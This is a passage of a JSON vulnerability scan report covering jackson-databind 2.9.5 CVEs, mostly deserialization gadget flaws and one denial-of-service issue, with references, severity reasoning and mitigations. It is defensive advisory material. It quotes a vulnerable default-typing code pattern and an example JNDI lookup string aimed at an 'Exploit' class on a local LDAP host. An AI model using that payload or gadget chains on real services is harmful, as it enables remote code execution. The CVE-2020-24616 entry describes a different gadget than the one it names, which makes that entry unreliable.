          "https://lists.apache.org/thread.html/rfa57d9c2a27d3af14c69607fb1a3da00e758b2092aa88eb6a51b6e99%40%3Cissues.zookeeper.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20200127-0004/",
          "https://lists.apache.org/thread.html/rb532fed78d031fff477fd840b81946f6d1200f93a63698dae65aa528@%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/r8831b7fa5ca87a1cf23ee08d6dedb7877a964c1d2bd869af24056a63@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r5d3d10fdf28110da3f9ac1b7d08d7e252f98d7d37ce0a6bd139a2e4f@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd49cfa41bbb71ef33b53736a6af2aa8ba88c2106e30f2a34902a87d2%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/ra8a80dbc7319916946397823aec0d893d24713cbf7b5aee0e957298c@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r3f8180d0d25a7c6473ebb9714b0c1d19a73f455ae70d0c5fefc17e6c%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r50f513772f12e1babf65c7c2b9c16425bac2d945351879e2e267517f%40%3Cissues.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://lists.apache.org/thread.html/r67f4d4c48197454b83d62afbed8bebbda3764e6e3a6e26a848961764@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r8831b7fa5ca87a1cf23ee08d6dedb7877a964c1d2bd869af24056a63%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/r2c77dd6ab8344285bd8e481b57cf3029965a4b0036eefccef74cdd44%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/rb532fed78d031fff477fd840b81946f6d1200f93a63698dae65aa528%40%3Ccommits.druid.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://lists.apache.org/thread.html/r428735963bee7cb99877b88d3228e28ec28af64646455c4f3e7a3c94@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r7fb123e7dad49af5886cfec7135c0fd5b74e4c67af029e1dc91ba744@%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/r5c14fdcabdeaba258857bcb67198652e4dce1d33ddc590cd81d82393@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r67f4d4c48197454b83d62afbed8bebbda3764e6e3a6e26a848961764%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r392099ed2757ff2e383b10440594e914d080511d7da1c8fed0612c1f@%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/r7fb123e7dad49af5886cfec7135c0fd5b74e4c67af029e1dc91ba744%40%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/r3f8180d0d25a7c6473ebb9714b0c1d19a73f455ae70d0c5fefc17e6c@%3Cissues.zookeeper.apache.org%3E",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://lists.apache.org/thread.html/rfa57d9c2a27d3af14c69607fb1a3da00e758b2092aa88eb6a51b6e99@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r50f513772f12e1babf65c7c2b9c16425bac2d945351879e2e267517f@%3Cissues.zookeeper.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-20330",
          "https://lists.apache.org/thread.html/rd6c6fef14944f3dcfb58d35f9317eb1c32a700e86c1b5231e45d3d0b@%3Ccommits.druid.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/issues/2526",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r5c3644c97f0434d1ceb48ff48897a67bdbf3baf7efbe7d04625425b3%40%3Ccommits.druid.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2020/02/msg00020.html",
          "https://lists.apache.org/thread.html/ra5ce96faec37c26b0aa15b4b6a8b1cbb145a748653e56ae83e9685d0@%3Cnotifications.zookeeper.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/fc4214a883dc087070f25da738ef0d49c2f3387e",
          "https://github.com/FasterXML/jackson-databind/commit/eb254813cc822d0af015ce8fe05febf50721dc53",
          "https://security.netapp.com/advisory/ntap-20200127-0004"
        ],
        "extended_information": {
          "short_description": "A typing issue in net.sf.ehcache in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [net.sf.ehcache]( http://hadoop.apache.org/) the attacker can call `lookup` with an arbitrary location by calling `toObjectImpl` with an arbitrary argument like `\"ldap://127.0.0.1:1088/Exploit\"`. This vulnerability allows the attacker to perform remote code execution as shown in this [PoC](https://www.programmersought.com/article/80917857170/) of an older issue by using marshalsec (see section \"Build an environment\").\n\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` net.sf.ehcache ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` net.sf.ehcache ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)\n\n##### Deployment mitigations\n\nRemove `net.sf.ehcache` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-42003",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-400",
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-400": {
                "name": "Uncontrolled Resource Consumption",
                "description": "The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources."
              },
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "In FasterXML jackson-databind before versions 2.13.4.1 and 2.12.17.1, resource exhaustion can occur because of a lack of a check in primitive value deserializers to avoid deep wrapper array nesting, when the UNWRAP_SINGLE_VALUE_ARRAYS feature is enabled.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.12.7.1]",
              "[2.13.4.1]",
              "[2.14.0]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-256565",
        "references": [
          "https://github.com/FasterXML/jackson-databind/commit/7ba9ac5b87a9d6ac0d2815158ecbeb315ad4dcdc",
          "https://security.netapp.com/advisory/ntap-20221124-0004",
          "https://www.debian.org/security/2022/dsa-5283",
          "https://lists.debian.org/debian-lts-announce/2022/11/msg00035.html",
          "https://github.com/FasterXML/jackson-databind/blob/2.13/release-notes/VERSION-2.x",
          "https://github.com/FasterXML/jackson-databind/commits/jackson-databind-2.4.0-rc1?after=75b97b8519f0d50c62523ad85170d80a197a2c86+174\u0026branch=jackson-databind-2.4.0-rc1\u0026qualified_name=refs%2Ftags%2Fjackson-databind-2.4.0-rc1",
          "https://github.com/FasterXML/jackson-databind/commit/d499f2e7bbc5ebd63af11e1f5cf1989fa323aa45",
          "https://security.netapp.com/advisory/ntap-20221124-0004/",
          "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=51020",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-42003",
          "https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.13.4.1...jackson-databind-2.13.4.2",
          "https://github.com/FasterXML/jackson-databind/commit/d78d00ee7b5245b93103fef3187f70543d67ca33",
          "https://github.com/FasterXML/jackson-databind/issues/3627",
          "https://github.com/FasterXML/jackson-databind/commit/cd090979b7ea78c75e4de8a4aed04f7e9fa8deea",
          "https://github.com/FasterXML/jackson-databind/issues/3590",
          "https://github.com/FasterXML/jackson-databind/commit/0e37a39502439ecbaa1a5b5188387c01bf7f7fa1",
          "https://github.com/advisories/GHSA-jjjh-jjxp-wpff",
          "https://github.com/FasterXML/jackson-databind/commit/2c4a601c626f7790cad9d3c322d244e182838288",
          "https://security.gentoo.org/glsa/202210-21"
        ],
        "extended_information": {
          "short_description": "Excessive recursion in Jackson-databind leads to denial of service when deserializing untrusted data with UNWRAP_SINGLE_VALUE_ARRAYS.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nIt was discovered that when the `UNWRAP_SINGLE_VALUE_ARRAYS` deserialization option is enabled (non-default), the deserialization of a deeply nested array could cause a stack exhaustion and subsequently crash the process.\nThis issue can be exploited when trying to deserialize untrusted data, for example -\n```java\nObjectMapper mapper = new ObjectMapper();\nmapper.enable(JsonParser.Feature.UNWRAP_SINGLE_VALUE_ARRAYS);\nmapper.readTree(untrusted_data); \n```\nThe issue is likely to be exploited in vulnerable configurations since a public exploit exists.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue has an exploit published",
              "description": "A crashing PoC is available through OSS-fuzz"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that gets deserialized by Jackson-databind via a `readTree`/`readValue`/`readValues` API call.  In addition, the mapper must enable the non-default `UNWRAP_SINGLE_VALUE_ARRAYS` feature.",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nIf possible, do not include the `UNWRAP_SINGLE_VALUE_ARRAYS` deserialization feature.\nSpecifically, remove this line from the code of the vulnerable application - \n`mapper.enable(JsonParser.Feature.UNWRAP_SINGLE_VALUE_ARRAYS);`"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2018-19360",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.8 might allow attackers to have unspecified impact by leveraging failure to block the axis2-transport-jms class from polymorphic deserialization.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.3]",
              "[2.7.9.5]",
              "[2.8.11.3]",
              "[2.9.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-74871",
        "references": [
          "https://access.redhat.com/errata/RHSA-2019:0877",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3@%3Ccommits.nifi.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b",
          "https://access.redhat.com/errata/RHSA-2019:2804",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://access.redhat.com/errata/RHSA-2019:3140",
          "https://access.redhat.com/errata/RHSA-2019:1823",
          "https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html",
          "https://access.redhat.com/errata/RHSA-2019:3892",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/c70da3cb6e3f03e0ad8013e38b6959419d866c4a7c80fdd34b73f25c@%3Ccommits.pulsar.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1822",
          "https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2018-19360",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1782",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b@%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b%40%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:0782",
          "https://lists.debian.org/debian-lts-announce/2019/03/msg00005.html",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://access.redhat.com/errata/RHBA-2019:0959",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:4037",
          "https://github.com/advisories/GHSA-f9hv-mg5h-xcw9",
          "https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20190530-0003",
          "https://lists.apache.org/thread.html/37e1ed724a1b0e5d191d98c822c426670bdfde83804567131847d2a3%40%3Cdevnull.infra.apache.org%3E",
          "https://lists.apache.org/thread.html/37e1ed724a1b0e5d191d98c822c426670bdfde83804567131847d2a3@%3Cdevnull.infra.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/c70da3cb6e3f03e0ad8013e38b6959419d866c4a7c80fdd34b73f25c%40%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html",
          "https://access.redhat.com/errata/RHSA-2019:3002",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "https://seclists.org/bugtraq/2019/May/68",
          "http://www.securityfocus.com/bid/107985",
          "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8",
          "https://github.com/FasterXML/jackson-databind/issues/2186",
          "https://access.redhat.com/errata/RHSA-2019:1797",
          "https://issues.apache.org/jira/browse/TINKERPOP-2121",
          "https://www.debian.org/security/2019/dsa-4452",
          "https://security.netapp.com/advisory/ntap-20190530-0003/",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3%40%3Ccommits.nifi.apache.org%3E"
        ],
        "extended_information": {
          "short_description": "A typing issue in axis2-transport-jms in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the blocked gadget is `org.apache.axis2.transport.jms.JMSOutTransportInfo`\nwhich has an unspecified impact (no technical details about the issue have been published).\n\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` axis2-transport-jms` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `axis2-transport-jms` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `axis2-transport-jms` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-24616",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-94",
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              },
              "CWE-94": {
                "name": "Improper Control of Generation of Code ('Code Injection')",
                "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "23"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.6 mishandles the interaction between serialization gadgets and typing, related to br.com.anteros.dbcp.AnterosDBCPDataSource (aka Anteros-DBCP).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.6]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-121514",
        "references": [
          "https://security.netapp.com/advisory/ntap-20200904-0006",
          "https://github.com/FasterXML/jackson-databind",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-24616",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://github.com/FasterXML/jackson-databind/commit/3d97153944f7de9c19c1b3637b33d3cf1fbbe4d7",
          "https://security.netapp.com/advisory/ntap-20200904-0006/",
          "https://github.com/FasterXML/jackson-databind/issues/2814"
        ],
        "extended_information": {
          "short_description": "Serialization gadget (Anteros-DBCP) in Jackson-databind allows arbitrary code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [pastdev.httpcomponents]( https://github.com/lucastheisen/httpcomponents) gadget, an attacker can\nachieve remote code execution by creating a `JndiConfiguration ` object and then calling the `load` method. This vulnerability allows the attacker to perform remote code execution as shown in this [PoC](https://www.programmersought.com/article/80917857170/) of an older issue by using marshalsec (see section \"Build an environment\").\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `Anteros-DBCP`  in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `Anteros-DBCP`  in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `Anteros-DBCP`` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-9548",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
